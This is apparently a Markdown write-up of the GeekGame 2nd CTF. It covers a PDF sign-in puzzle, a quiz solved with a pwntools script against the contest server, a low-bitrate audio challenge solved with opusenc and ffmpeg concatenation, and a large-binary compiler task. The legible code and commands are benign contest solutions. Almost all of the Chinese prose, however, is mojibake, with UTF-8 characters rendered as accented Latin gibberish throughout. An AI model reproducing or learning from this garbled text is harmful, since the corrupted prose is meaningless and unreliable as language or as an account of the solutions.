# GeekGame 2nd Writeup

> ç¬¬ä¸€æ¬¡æ‰“CTFç±»æ¯”èµ›ï¼ŒWaku Waku

## â€ ç­¾åˆ°â€ 

å³ä½¿æ²¡æœ‰çœ‹è¿‡ç¬¬ä¸€å±Šçš„ç­¾åˆ°é¢˜ï¼Œä¹Ÿä¸€çœ¼å°±è®¤å‡ºæ¥äº†ç¬¦å·æ˜¯ç‰¹æ®Šå­—ä½“ã€‚ä½†å½“æˆ‘ç”¨Adobe Acrobatæ‰“å¼€PDFï¼Œè¯•ç€å¤åˆ¶è¿™äº›ç¬¦å·æ—¶ï¼Œé—®é¢˜å‡ºç°äº†ï¼šæˆ‘å¤åˆ¶é€‰é¡¹å‘¢ï¼Ÿ

![image-20221126211016116](README.assets/image-20221126211016116.png)

ç‚¹å‡»ç¼–è¾‘æ–‡æœ¬ï¼Œå‘ç°pdfè¢«åŠ å¯†ï¼Œæ— æ³•ç¼–è¾‘ã€‚å¯¼å‡ºæˆWordç­‰ä¹Ÿéœ€è¦å¯†ç ã€‚äºæ˜¯ï¼Œæˆ‘è¢«ç­¾åˆ°é¢˜å¡äº†ï¼ç¬¬ä¸€æ¬¡å‚åŠ CTFçš„èŒæ–°å—åˆ°äº†æå¤§çš„ä¿¡å¿ƒæ‰“å‡»ã€‚

åšå‡ºäº†åé¢çš„ä¸‰é¢˜åï¼Œæˆ‘çœ‹äº†ä¸€çœ¼æ¦œï¼Œå‘ç°å¤§å®¶éƒ½æ²¡æœ‰å¡ç­¾åˆ°é¢˜ï¼Œæ‰€ä»¥é—®é¢˜ä¸€å®šä¸åœ¨é¢˜è€Œåœ¨æˆ‘ã€‚äºæ˜¯æˆ‘åœ¨Chromeé‡Œæ‰“å¼€äº†PDFï¼Œå‘ç°Chromeé‡Œä¹Ÿæ²¡æœ‰åŠæ³•å¤åˆ¶ï¼Œä½†ç«Ÿç„¶å¯ä»¥æœç´¢ï¼š

![image-20221126211602911](README.assets/image-20221126211602911.png)

ç‚¹å‡»ç™¾åº¦æœç´¢åï¼Œä»æœç´¢æ¡†é‡Œå¤åˆ¶å‡ºæ¥ä¸¤è¡Œæ–‡å­—ï¼š

```
fa{hns4PaigGeGm!
lgTak__lyn_ekae}
```

åˆ©ç”¨æ …æ åŠ å¯†ï¼ˆä¹Ÿå°±æ˜¯ä¸Šä¸‹äº¤æ›¿è¯»ï¼‰å³å¯è¿˜åŸå‡ºflag

## å°åŒ—é—®ç­” Â· æé€Ÿç‰ˆ

ç”±äºç­¾åˆ°é¢˜å¡äº†ï¼Œæ­¤é¢˜å…‰è£æˆä¸ºäº†æˆ‘äººç”Ÿä¸­åšå‡ºçš„ç¬¬ä¸€é“CTFé¢˜ã€‚æœ¬é¢˜çœ‹èµ·æ¥ä¸»è¦è€ƒå¯Ÿæœç´¢å¼•æ“ä½¿ç”¨ã€‚

### é¢˜ç›®è§£æ

> æ”¯æŒ WebP å›¾ç‰‡æ ¼å¼çš„æœ€æ—© Firefox ç‰ˆæœ¬æ˜¯å¤šå°‘ï¼Ÿ

![image-20221126212820177](README.assets/image-20221126212820177.png)

ç­”æ¡ˆï¼š65

> è®¿é—®ç½‘å€ `http://ctf.ä¸–ç•Œä¸€æµå¤§å­¦.com`æ—¶ï¼Œå‘è¯¥ä¸»æœºå‘é€çš„ HTTP è¯·æ±‚ä¸­ Host è¯·æ±‚å¤´çš„å€¼æ˜¯ä»€ä¹ˆï¼Ÿ

åœ¨Chromeä¸­æŒ‰ä¸‹F12ï¼Œé€‰æ‹©ç½‘ç»œé€‰é¡¹å¡ï¼Œå³å¯æŸ¥çœ‹åˆ°HTTPè¯·æ±‚çš„æ—¥å¿—ã€‚

![image-20221126213237990](README.assets/image-20221126213237990.png)

ä¸éš¾å‘ç°ï¼Œè®¿é—®äº†è¿œç¨‹ä¸»æœº`ctf.xn--4gqwbu44czhc7w9a66k.com`ï¼Œå†ç”±æ­¤ä¸»æœºé‡å®šå‘åˆ°äº†æ¯”èµ›ä¸»é¡µã€‚

å¯æ˜¯ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚ä¸­çš„Hostè¯·æ±‚å¤´å‘¢ï¼ŸèŒæ–°ä¸çŸ¥é“ï¼ŒèŒæ–°æŒ‰ç…§ä¸»æœºåç†è§£ï¼ŒèŒæ–°ç­”æ¡ˆæ­£ç¡®äº†

> åŒ—äº¬å¤§å­¦æŸå®éªŒå®¤æ›¾å¼€å‘äº†ä¸€ä¸ªå« gStore çš„æ•°æ®åº“è½¯ä»¶ã€‚æœ€æ—©æè¿°è¯¥è½¯ä»¶çš„è®ºæ–‡çš„ DOI ç¼–å·æ˜¯å¤šå°‘

ä½¿ç”¨è°·æ­Œå­¦æœ¯æœç´¢

![image-20221126214107475](README.assets/image-20221126214107475.png)

ä¸‹é¢ä¸¤ä¸ªå¸¦`-`çš„æ’é™¤ï¼Œä¸Šé¢ä¸¤ä¸ªä¸­ï¼Œç‚¹å‡»æ—¶é—´è¾ƒæ—©çš„2011å¹´çš„è®ºæ–‡

![image-20221126214254339](README.assets/image-20221126214254339.png)

è™½ç„¶ä¸çŸ¥é“ä»€ä¹ˆæ˜¯DOIç¼–å·ï¼Œä½†è¿™ä¸ªé¡µé¢é‡Œå¯ä»¥çœ‹åˆ°DOIçš„å­—æ ·ã€‚è¯•äº†ä¸€ä¸‹`doi.org`åé¢çš„`10.14778/2002974.2002976`ï¼Œå‘ç°æœç„¶ç­”æ¡ˆæ­£ç¡®

> æ¯ä¸ª Android è½¯ä»¶éƒ½æœ‰å”¯ä¸€çš„åŒ…åã€‚åŒ—äº¬å¤§å­¦è¯¾å¤–é”»ç‚¼ä½¿ç”¨çš„æœ€æ–°ç‰ˆ PKU Runner è½¯ä»¶çš„åŒ…åæ˜¯ä»€ä¹ˆï¼Ÿ

æŒ‰ç…§Javaçš„åŒ…å‘½åè§„åˆ™ï¼Œè¯•äº†ä¸€ä¸‹`cn.pku.edu.pkurunner`ï¼Œç«Ÿç„¶ç›´æ¥å¯¹äº†

> åœ¨ç¬¬ä¸€å±Š PKU GeekGame æ¯”èµ›çš„é¢˜ç›®ã€Šç”µå­æ¸¸æˆæ¦‚è®ºã€‹ä¸­ï¼Œé€šè¿‡ç¬¬ %d çº§å…³å¡éœ€è¦å¤šå°‘é‡‘é’±ï¼Ÿ

é€šè¿‡ä¸»åŠæ–¹æä¾›çš„é“¾æ¥ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¿™é“é¢˜çš„ä»£ç ä»“åº“åœ°å€ï¼š`https://github.com/PKU-GeekGame/geekgame-1st/blob/master/src/pygame/`

åœ¨æ¯ä¸ªæ–‡ä»¶é‡Œæœç´¢levelï¼Œåœ¨`game/server/libtreasure.py`ä¸­æ‰¾åˆ°äº†ä»¥ä¸‹ä»£ç ï¼š

```python
GOAL_OF_LEVEL = lambda level: 300+int(level**1.5)*100
```

æ ¹æ®è¯¥å¼è®¡ç®—å‡ºç»“æœï¼Œç»éªŒè¯ï¼Œæ­£ç¡®

> è§†é¢‘ bilibili.com/video/BV1EV411s7vu ä¹Ÿå¯ä»¥é€šè¿‡ `bilibili.com/video/av_____` è®¿é—®ã€‚ä¸‹åˆ’çº¿å†…åº”å¡«ä»€ä¹ˆæ•°å­—ï¼Ÿ

![image-20221126220649801](README.assets/image-20221126220649801.png)

åˆ©ç”¨æœç´¢åˆ°çš„ç½‘é¡µå·¥å…·è½¬æ¢å³å¯å¾—åˆ°ç­”æ¡ˆ`418645518`

> æˆ‘æœ‰ä¸€ä¸ªæœ‹å‹åœ¨ç¾å›½ï¼Œä»–æ— çº¿è·¯ç”±å™¨çš„ MAC åœ°å€æ˜¯ d2:94:35:21:42:43ã€‚è¯·é—®ä»–æ‰€åœ¨åœ°çš„é‚®ç¼–æ˜¯å¤šå°‘ï¼Ÿ

æœäº†ä¸€ä¸‹åˆ¶é€ å•†ï¼Œæ²¡æœ‰ä»»ä½•å¤´ç»ªï¼Œæ”¾å¼ƒã€‚è¿˜å¥½è¿™é“é¢˜ä¸ä¸€å®šè¢«éšæœºå‡ºæ¥

> æˆ‘åˆšåˆšåœ¨è„‘æµ·ä¸­æƒ³äº†ä¸€ä¸ªä»‹äº %d åˆ° %d ä¹‹é—´çš„è´¨æ•°ã€‚çŒœçŒœå®ƒæ˜¯å¤šå°‘ï¼Ÿ

èŒƒå›´ä¸å¤§ï¼Œçº¦130ï¼Œæšä¸¾æ‰€æœ‰æ•´æ•°å¹¶ç”¨æ ¹å·å¤æ‚åº¦åˆ¤æ–­å³å¯ã€‚å¾—åˆ°çš„è´¨æ•°ä¸æ­¢ä¸€ä¸ªï¼ŒèŒæ–°æ„Ÿåˆ°å¾ˆç–‘æƒ‘ï¼Œä½†æœ‰æ—¶å€™å›ç­”æœ€å°çš„é‚£ä¸ªå¯ä»¥ç­”æ¡ˆæ­£ç¡®ï¼Œé‚£å°±è¿™æ ·å§ï¼ˆçœ‹äº†ç¬¬äºŒé˜¶æ®µæç¤ºï¼Œæˆ‘æ‰çŸ¥é“è¿™æ˜¯æ­£å¸¸ç°è±¡ï¼‰

### åŠæ ¼æ‘†çƒ‚

ä¸Šé¢çš„8é¢˜ä¸­ï¼Œæœ‰6é“é¢˜å¯ä»¥ç¨³å®šåšå¯¹ï¼Œè¿™æ ·å°±å·²ç»æ‹¿åˆ°äº†6*14=84åˆ†~~ï¼ˆå–œææ­£æ€ï¼‰~~

### æ»¡åˆ†å·ç‹

åœ¨3ç§’å†…ç­”å¯¹7é“é¢˜ç›®ï¼Œæ˜¾ç„¶éœ€è¦è‡ªåŠ¨åŒ–å·¥å…·ã€‚åœ¨é•¿è¾¾1å°æ—¶çš„`pwntools`å­¦ä¹ åï¼Œæˆ‘æ„è¯†åˆ°ï¼Œåœ¨è¾“å…¥`æ€¥æ€¥æ€¥`å‰ï¼Œå‰åŠè¡Œçš„`>`æ— æ³•é€šè¿‡`recvline`è¯»å–ã€‚è§£å†³æ–¹æ³•æ˜¯ï¼š

```python
conn = remote('prob01.geekgame.pku.edu.cn',10001,typ='tcp')
conn.send(myToken)
conn.recvuntil(b'> ')
```

å…¶ä»–äº¤äº’è¾“å‡ºéƒ½æ˜¯æ•´è¡Œï¼Œå¯ä»¥ä½¿ç”¨`recvline`è·å–ã€‚ä»è·å–çš„è¡Œä¸­é€‰å–å«æœ‰é¢˜é¢çš„è¡Œï¼Œç”±å…³é”®å­—åˆ¤æ–­æ˜¯å“ªé“é¢˜ç›®ï¼Œç”±æ­£åˆ™è¡¨è¾¾å¼`\d`åŒ¹é…å‡ºé¢˜ç›®ä¸­å«æœ‰çš„æ•°å­—ï¼Œå³å¯è‡ªåŠ¨åŒ–åšé¢˜ã€‚å¾ˆå¹¸è¿åœ°ï¼Œæˆ‘ç”¨äº†2æ¬¡å°±å¾—åˆ°äº†æ»¡åˆ†ã€‚ç¬¬äºŒé˜¶æ®µä¸­ï¼Œæˆ‘çŸ¥é“äº†åœ¨ä¸ä¼šåšMACé¢˜æ—¶ï¼Œæ¯æ¬¡å°è¯•é€šè¿‡æ¦‚ç‡ä»…ä¸º1/72ï¼ˆ~~æ‰€ä»¥è¯´ï¼Œæˆ‘ğŸ¶äº†ï¼Ÿ~~ï¼‰

è‡³æ­¤ï¼Œæˆ‘åšå‡ºäº†äººç”Ÿä¸­ç¬¬ä¸€é“CTFé¢˜ï¼Œæˆä¸ºäº†ä¸€åæˆç†Ÿçš„CTFåšé¢˜å®¶ï¼Œå› æ­¤åé¢å°†ä¸å†ç”¨èŒæ–°è‡ªç§°ã€‚

## æˆ‘ç”¨108å¤©å½•äº†ä¸ªéŸ³

> å¹´è½»äººçš„ç¬¬ä¸€ä¸ªä¸€è¡€

ç”±äºæ‰“ç®—è®¤çœŸå†™ä¸€ä¸‹åšæ³•ï¼Œæˆ‘å†³å®šæŠŠè¿™é¢˜æ”¾åœ¨é å‰çš„ä½ç½®

### éŸ³æº

å½•éŸ³éš¾å…ä¼šç”±äºæ°”æµå’Œçº¿ç¼†äº§ç”Ÿå™ªéŸ³ï¼Œåœ¨æä½ç ç‡åœºæ™¯è¿™äº›å™ªéŸ³ä¸‹å¯èƒ½å¯¹ä¿¡å™ªæ¯”äº§ç”Ÿè¾ƒå¤§å½±å“ï¼Œå› æ­¤é€‰æ‹©è¯­éŸ³åˆæˆæ‰æ˜¯æ­£é“ã€‚é¢˜é¢ä¸Šçš„**å¤§å£°èƒŒè¯µ**å››ä¸ªå­—è®©æˆ‘æ›´åŠ ç¡®ä¿¡äº†è¿™ä¸€ç‚¹ã€‚

æƒ³åˆ°æ–‡å­—è½¬è¯­éŸ³ï¼Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯é›†æˆåœ¨Windowsè®²è¿°äººã€‚è®²è¿°äººæœåŠ¡æ‰€ä½¿ç”¨çš„è¯­éŸ³åˆæˆå¼•æ“æ˜¯`Microsoft Huihui Desktop`ã€‚åœ¨Adobe Auditionä¸­ï¼Œä¹Ÿæä¾›äº†è°ƒç”¨è¯¥åˆæˆç¨‹åºçš„é€‰é¡¹ã€‚ç„¶è€Œï¼Œè¯¥å¼•æ“çš„åˆæˆæ•ˆæœä»¤äººä¸€è¨€éš¾å°½ï¼Œè¯­é€Ÿè¾ƒå¿«æ—¶ç”Ÿæˆçš„è¯­éŸ³ç¨³å®šè¢«è¯†åˆ«æˆâ€œç§‘æŠ€å¹¶å¸¦ç€ä¿±å‘³â€ã€â€œæˆ‘è§‰å¾—è¿™å¤ªå›°äº†â€ã€‚ç»è¿‡äººå·¥è¯„æµ‹ï¼Œæˆ‘è§‰å¾—è¯†åˆ«æ•ˆæœå·®çš„åŸå› å¾ˆå¯èƒ½åœ¨äºå…¶è¿è¯æˆå¥æ—¶æ²¡æœ‰ä»»ä½•è¯­è°ƒä¿®æ­£ï¼Œä½¿å¾—è¯­éŸ³è¯†åˆ«æœåŠ¡éš¾ä»¥é€šè¿‡è¯­è°ƒåˆ¤æ–­å¥å­æˆåˆ†ã€‚

æœ¬åœ°è‡ªå¸¦çš„è¯­éŸ³åˆæˆä¸è¡Œï¼Œäºæ˜¯æˆ‘å¼€å§‹å¯»æ‰¾åœ¨çº¿æœåŠ¡ã€‚æ—¢ç„¶è¯†åˆ«ç”¨çš„æ˜¯è…¾è®¯äº‘ï¼Œé‚£æˆ‘ä»¬å°±ç”¨è…¾è®¯äº‘çš„è¯­éŸ³åˆæˆï¼Œå½¢æˆä¸€ä¸ª**ç”Ÿæ€é—­ç¯**ï¼Œå²‚ä¸ç¾å“‰ï¼Ÿ

![image-20221127045349476](README.assets/image-20221127045349476.png)

äºæ˜¯ï¼Œæˆ‘å«æ³ªæ¿€æ´»äº†æœ‰æ•ˆæœŸä»…3ä¸ªæœˆçš„è…¾è®¯äº‘è¯­éŸ³åˆæˆå…è´¹é¢åº¦ã€‚ä¸å¾—ä¸è¯´ï¼Œè…¾è®¯äº‘åˆæˆçš„ä¸­æ–‡è¯­éŸ³åˆæˆç»“æœçˆ†æ€å¾®è½¯çš„`Huihui Desktop`ã€‚æˆ‘é€‰æ‹©äº†æ™ºé–ï¼ˆç²¾å“ï¼‰éŸ³è‰²ï¼Œè®¾ç½®è¯­é€Ÿä¸º2ï¼Œåˆæˆäº†æ‰€éœ€çš„äº”å¥è¯çš„wavæ–‡ä»¶ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªå‘æ˜¯ç”Ÿæˆçš„wavæ–‡ä»¶å…·æœ‰16000Hzçš„é‡‡æ ·ç‡ã€‚æˆ‘é€šè¿‡Adobe Auditionï¼Œå°†è¿™äº”ä¸ªwavæ–‡ä»¶è½¬åŒ–ä¸º8000Hzã€‚

é™éŸ³æ®µå°±ç®€å•äº†ï¼Œä½¿ç”¨Adobe Auditionçš„ç¼–è¾‘-æ’å…¥-é™éŸ³ï¼Œå³å¯ç”Ÿæˆä»»æ„é•¿åº¦çš„é™éŸ³éŸ³é¢‘ã€‚æˆ‘ç”Ÿæˆäº†ä¸€ä¸ª9.77sçš„é™éŸ³æ®µã€‚é™éŸ³æ®µæ—¶é—´è®¾ç½®è¾ƒçŸ­æœ‰ä¸¤æ–¹é¢çš„è€ƒè™‘ï¼šä¸€æ˜¯å•å¥å½•éŸ³å¼€å¤´å¯èƒ½æœ‰ç©ºç™½æ—¶é•¿ï¼›äºŒæ˜¯é˜…è¯»æºç å¯ä»¥å‘ç°ï¼Œâ€œæ¯å¥è¯ä¹‹é—´çš„é—´éš”â€å®šä¹‰ä¸ºæ˜¯ä¸Šä¸€å¥çš„æœ€åä¸€ä¸ªè¯çš„**å¼€å§‹**æ—¶é—´ï¼Œä¸æœ¬å¥è¯ç¬¬ä¸€ä¸ªè¯çš„**å¼€å§‹**æ—¶é—´çš„æ—¶é—´å·®ï¼Œå› æ­¤æ¯å¥è¯çš„æœ€åä¸€ä¸ªè¯ä¼šè¢«è®¡å…¥é™éŸ³æ—¶é—´ã€‚

### æ ¼å¼åˆç­›

æ”¯æŒçš„æ–‡ä»¶æ ¼å¼å…±æœ‰`wav, pcm, ogg, mp3, m4a, aac`å…­ç§ã€‚é¦–å…ˆæ’é™¤å®Œå…¨æ— å‹ç¼©çš„`wav`å’Œ`pcm`æ ¼å¼ï¼Œå…¶æ¬¡æ’é™¤è¿‡äºå¤è€è€Œåœ¨ä½ç ç‡ä¸‹æ•ˆæœå¥‡å·®çš„`mp3`ã€‚`aac`æ˜¯`MPEG-2`æ ‡å‡†ï¼Œ`m4a`æ˜¯`MPEG-4`æ ‡å‡†ï¼ˆç¼–ç è¿˜æ˜¯å«AACï¼Œä½†æ˜¯æ–‡ä»¶å®¹å™¨æœ‰æ‰€æ›´æ–°ï¼‰ï¼Œ`ogg`æ˜¯ä¸€ä¸ªå¼€æºæ ‡å‡†ã€‚`aac`å’Œ`ogg`å‡æ”¯æŒä½è‡³2kbit/sä»¥ä¸‹çš„ç ç‡ï¼ˆBitrateï¼‰ã€‚å› æ­¤ï¼Œæˆ‘å†³å®šåˆ†åˆ«å°è¯•è¿™ä¸¤ç§æ–‡ä»¶æ ¼å¼ã€‚

`ogg`æ ¼å¼é€‰ç”¨æœ€æ–°æœ€çƒ­çš„ç¼–ç opusï¼Œç¼–ç å™¨é€‰æ‹©å®˜æ–¹çš„[opus-tools](https://archive.mozilla.org/pub/opus/win32/opus-tools-0.2-opus-1.3.1.zip)ã€‚

`aac`æœ‰å¾ˆå¤šç¼–ç ï¼Œä¹Ÿæœ‰å¾ˆå¤šç¼–ç å™¨ï¼Œçœ‹å¾—æˆ‘çœ¼èŠ±ç¼­ä¹±ï¼Œäºæ˜¯æˆ‘éšæ‰‹æŒ‘äº†ä¸€ä¸ªå¤§å®¶éƒ½è¯´å¥½çš„å¼€æºç¼–ç å™¨`ffmpeg`ã€‚

### å‹ç¼©

#### OGG

æ ¹æ®[Opuså®˜ç½‘](https://www.opus-codec.org/)ï¼ŒOpusæ”¯æŒçš„ç ç‡æœ€ä½å¯è¾¾6kb/sã€‚æˆ‘å°è¯•äº†è¿›è¡Œç ç‡6kb/sä»¥ä¸‹çš„ç¼–ç ï¼Œå‘ç°è™½ç„¶ä¸ä¼šæŠ¥é”™ï¼Œä½†ä¼šå¸¦æ¥ä¸å¯å¿å—çš„éŸ³è´¨é”å‡ï¼Œå› æ­¤æœ‰å£°æ®µåªèƒ½é€‰æ‹©6kb/sã€‚

```bash
opusenc --bitrate 6 --speech --comp 10 --framesize 60 vocal.wav --hard-cbr vocal.ogg
```

å½“ç„¶ï¼Œé™éŸ³æ®µå¹¶ä¸éœ€è¦æ‹…å¿ƒéŸ³è´¨çš„é—®é¢˜ã€‚æˆ‘æ‰¾åˆ°äº†`opus-tools`çš„[ä»£ç ](https://github.com/xiph/opus-tools/blob/master/src/opusenc.c#L957)ï¼Œå‘ç°å¯è¾“å…¥çš„æœ€ä½ç ç‡ä¸º500b/sã€‚é™éŸ³æ®µçš„ç ç‡è®¾ç½®ä¸º500b/så°±å¥½ã€‚

```bash
opusenc --bitrate 0.5 --comp 10 --framesize 60 silence.wav --hard-cbr silence.ogg
```

#### ACC/M4A

è‡³äºAACå’ŒM4Aï¼Œç»´åŸºç™¾ç§‘è¯´åˆ°ï¼š

> The [MPEG-4](https://en.wikipedia.org/wiki/MPEG-4) audio coding algorithm family spans the range from low bit rate speech encoding (down to 2 kbit/s) to high-quality audio coding (at 64 kbit/s per channel and higher).

å› æ­¤æˆ‘è®¾ç½®æœ‰å£°æ®µç ç‡ä¸º2kb/sï¼Œé™éŸ³æ®µåŒæ ·é€‰æ‹©0.5kb/s

```bash
ffmpeg -i vocal.wav -b:a 2000 -ar 8000 vocal.aac -y
ffmpeg -i silence.wav -b:a 500 -ar 8000 silence.aac -y
```

### æ‹¼æ¥

`ffmpeg`æä¾›äº†å°†ä¸åŒç ç‡çš„éŸ³é¢‘æ‹¼æ¥çš„åŠŸèƒ½ï¼Œä»¥OGGæ–‡ä»¶ä¸ºä¾‹ï¼š

```bash
ffmpeg -f concat -i inputs.txt -c copy -ar 8000 out.ogg -y
```

ä½œä¸ºä¸Šè¿°å‘½ä»¤å‚æ•°çš„`inputs.txt`ä¸­ï¼Œåˆ—å‡ºäº†è¦æ‹¼æ¥çš„éŸ³é¢‘æ–‡ä»¶

```
file 'he1.ogg'
file 'silence.ogg'
file 'he2.ogg'
file 'silence.ogg'
file 'he3.ogg'
file 'silence.ogg'
file 'he4.ogg'
file 'silence.ogg'
file 'he5.ogg'
```

å…¶ä»–æ–‡ä»¶æ ¼å¼çš„æ‹¼æ¥ï¼Œåªéœ€è¦ä¿®æ”¹ä¸Šé¢æ‰€æœ‰çš„æ–‡ä»¶æ‹“å±•åå³å¯

å¯èƒ½æœ‰è¯»è€…ä¼šå¥½å¥‡ï¼šæŠŠéŸ³é¢‘æ–‡ä»¶ä»¥å­—èŠ‚æ•°ç»„å½¢å¼æš´åŠ›æ‹¼èµ·æ¥ä¸å°±è¡Œäº†å—ï¼Ÿäº‹å®ä¸Šï¼Œæ¯ä¸ªæ–‡ä»¶ä¸­éƒ½å­˜åœ¨ç€**éŸ³é¢‘æµ**çš„å…ƒæ•°æ®ï¼Œæš´åŠ›æ‹¼æ¥ä¼šä½¿å¾—è¿™äº›å…ƒæ•°æ®è¢«é‡å¤9æ¬¡ï¼Œé€ æˆç©ºé—´ä¸Šçš„æµªè´¹ã€‚

### åŠ é€Ÿï¼

å¯¹åŒæ ·çš„wavè¾“å…¥éŸ³é¢‘ï¼Œä¸‰ç§æ–‡ä»¶æ ¼å¼çš„å‹åˆ¶å‚æ•°å’Œç»“æœå¦‚ä¸‹

| æ–‡ä»¶æ ¼å¼ | é™éŸ³æ®µç ç‡(kb/s) | æœ‰å£°æ®µç ç‡(kb/s) | ç¼–ç è½¯ä»¶   | å¤§å°(B) |
| -------- | ---------------- | ---------------- | ---------- | ------- |
| OGG      | 0.5              | 6                | opus-tools | 8245    |
| AAC      | 0.5              | 2                | ffmpeg     | 10443   |
| M4A      | 0.5              | 2                | ffmpeg     | 10353   |

å¯ä»¥çœ‹åˆ°ï¼Œ`ogg`åœ¨é«˜ç ç‡ä¸‹å‹å‡ºçš„æ–‡ä»¶å¤§å°åè€Œæ›´å°ï¼Œç©ºé—´åˆ©ç”¨ç‡ä¼˜ç§€ã€‚ç„¶è€Œï¼Œ8245Bä»ç„¶è¶…è¿‡äº†ï¼ˆç¬¬ä¸€é˜¶æ®µçš„ï¼‰å¤§å°é™åˆ¶ã€‚

å¯¹æ­¤ï¼Œæˆ‘æ‰“å¼€äº†Adobe Auditionï¼Œæ•ˆæœ-æ—¶é—´ä¸å˜è°ƒ-ä¼¸ç¼©ä¸å˜è°ƒï¼ˆå¤„ç†ï¼‰ï¼Œå°†æ‰€æœ‰æœ‰å£°æ®µçš„æ—¶é—´éƒ½å‹ç¼©åˆ°äº†80%ã€‚

![image-20221127175323565](README.assets/image-20221127175323565.png)

åŠ é€Ÿåï¼ŒOGGæ–‡ä»¶çš„å¤§å°å˜æˆäº†7390å­—èŠ‚ã€‚æˆ‘è¿å¿™äº¤ä¸Šå»ï¼Œç»“æœç¬¬äºŒå¥è¢«è¯†åˆ«æˆäº†â€œéƒ½è§‰å¾—è¿™å¾ˆé…·å—â€ã€‚

ä¸å¾—å·²ï¼Œæˆ‘å°†ç¬¬äºŒå¥çš„ä¼¸ç¼©æ“ä½œæ’¤é”€ï¼Œé‡è¯•äº†ä¸€æ¬¡ã€‚è¿™æ¬¡å¤§å°æ˜¯7528å­—èŠ‚ï¼Œå¹¶ä¸”èƒ½è¯†åˆ«å‡ºæ¥äº†ã€‚äºæ˜¯æˆ‘ä»¬è·å¾—äº†Flag1ã€‚

### 30s

åœ¨ç¬¬ä¸€é˜¶æ®µï¼Œæˆ‘å‘ç°AACæ–‡ä»¶åœ¨ä½¿ç”¨`ffprobe`æŸ¥çœ‹ä¿¡æ¯æ—¶ï¼Œè¾“å‡ºçš„éŸ³é¢‘æ—¶é•¿ä¼šä¸å®é™…æ—¶é•¿ä¸ç¬¦ã€‚ç„¶è€Œï¼Œä¸è®ºæˆ‘æ€ä¹ˆæ›´æ¢å‚æ•°ï¼Œè¾“å‡ºçš„æ—¶é•¿éƒ½åªä¼šæ¯”å®é™…æ›´é•¿ï¼Œè€Œéæ›´çŸ­ã€‚

ç¬¬äºŒé˜¶æ®µè·å¾—äº†æç¤ºä»¥åï¼Œæˆ‘æ‰æ„è¯†åˆ°ä¸Šé¢æåˆ°çš„â€œæŠŠéŸ³é¢‘æ–‡ä»¶ä»¥å­—èŠ‚æ•°ç»„å½¢å¼æš´åŠ›æ‹¼èµ·æ¥â€å¹¶éå®Œå…¨æ²¡ç”¨ã€‚äº‹å®ä¸Šï¼Œä½¿ç”¨`ffmpeg -f concat`å¾—åˆ°ä¸¤ä¸ªä¸è¶…è¿‡30sçš„éŸ³é¢‘æ–‡ä»¶ï¼š`ç§‘æŠ€å¹¶å¸¦ç€è¶£å‘³ é™éŸ³ ä¸è§‰å¾—è¿™å¾ˆé…·å— é™éŸ³`ä¸`ä½œä¸ºä¸€åç†å·¥ç”· é™éŸ³ æˆ‘è§‰å¾—è¿™å¤ªé…·äº† é™éŸ³ å¾ˆç¬¦åˆæˆ‘å¯¹æœªæ¥ç”Ÿæ´»çš„æƒ³è±¡`ï¼Œå†æš´åŠ›æ‹¼æ¥å³å¯è·å¾—ä¸€ä¸ª`ffprobe`è®¤ä¸ºæ—¶é•¿ä¸è¶³30sçš„ï¼Œå¤§å°ä¸º7620Bçš„OGGæ–‡ä»¶ï¼Œä»è€Œè·å¾—Flag2ã€‚

æˆ‘ä¸ºä»€ä¹ˆä¹‹å‰æ²¡å‘ç°å‘¢ï¼Ÿæ˜¯å› ä¸ºæˆ‘åœ¨ä¸Šä¼ ä¹‹å‰éƒ½ä¼šè‡ªå·±å¬ä¸€ä¸‹æ•ˆæœï¼Œè€Œç”¨ä¸Šè¿°åšæ³•å¾—åˆ°çš„OGGæ–‡ä»¶ï¼Œåœ¨æˆ‘æœ¬åœ°çš„**æ‰€æœ‰**éŸ³ä¹æ’­æ”¾å™¨ä¸­ï¼Œéƒ½åªèƒ½æ”¾å‡ºæ¥å‰ä¸¤æ®µã€‚äºæ˜¯ï¼Œæˆ‘æ”¾å¼ƒäº†ä¸Šä¼ ï¼Œä¸æ»¡è¡€ç‰ˆçš„ä¸¤å¨é‡å¥–ç« å¤±ä¹‹äº¤è‡‚ã€‚æˆ‘çš„è¯„ä»·æ˜¯ï¼Œä¸æ˜¯`ffprobe`æœ‰é—®é¢˜ï¼Œè€Œæ˜¯è…¾è®¯äº‘çš„è¯†åˆ«å¤ªç¥å¥‡ã€‚

## ç¼–åŸè¯‘ç†ä¹ é¢˜è¯¾

### ç©æŒºå¤§

ä¸åä¸¤è€…ä¸åŒï¼Œè¾“å‡ºå¤§ç¨‹åº**å±äºæ­£å¸¸ä½¿ç”¨**ã€‚æˆ‘ä»¬æ¥å›é¡¾ä¸€ä¸‹è®¡ç®—æœºç³»ç»Ÿå¯¼è®ºï¼š

![image-20221126225545934](README.assets/image-20221126225545934.png)

ç¼–è¯‘å‡ºçš„ç¨‹åºå°±æ˜¯å¦‚å›¾æ‰€ç¤ºçš„ELFæ–‡ä»¶ã€‚å…¶ä¸­`.data`æ®µæ˜¯å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡ï¼Œä¼šè¢«å®Œæ•´åœ°å­˜å‚¨åœ¨ç¨‹åºä¸­ï¼›`.bss`æ®µæ˜¯æ²¡æœ‰åˆå§‹åŒ–çš„å…¨å±€å˜é‡ï¼Œä»…è®°å½•å¤§å°ï¼Œä¸å®é™…å æ®ç©ºé—´ï¼Œè¿è¡Œæ—¶æ‰è¢«åŠ è½½ä¸ºå…¨0çš„å†…å­˜æ®µã€‚å› æ­¤æˆ‘ä»¬æƒ³è¦è®©ç¨‹åºå¾ˆå¤§ï¼Œåªéœ€è¦å°†ä¸€ä¸ªå¾ˆå¤§çš„å…¨å±€å˜é‡å­˜åˆ°`.data`æ®µå³å¯ã€‚

```cpp
char s[9000000]="My guiding star";
int main(){}
```

ç¼–è¯‘ä¸Šé¢çš„ä»£ç æ—¶ï¼Œå ç”¨äº†çº¦9MBçš„`s`æ•°ç»„è¢«èµ‹äºˆäº†åˆå§‹å€¼ï¼Œå› æ­¤ä¼šè¢«å®Œæ•´æ”¾ç½®åœ¨`.data`æ®µã€‚è¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†å¤§å°ç¬¦åˆè¦æ±‚çš„ç¨‹åºã€‚

### ç©æŒºé•¿

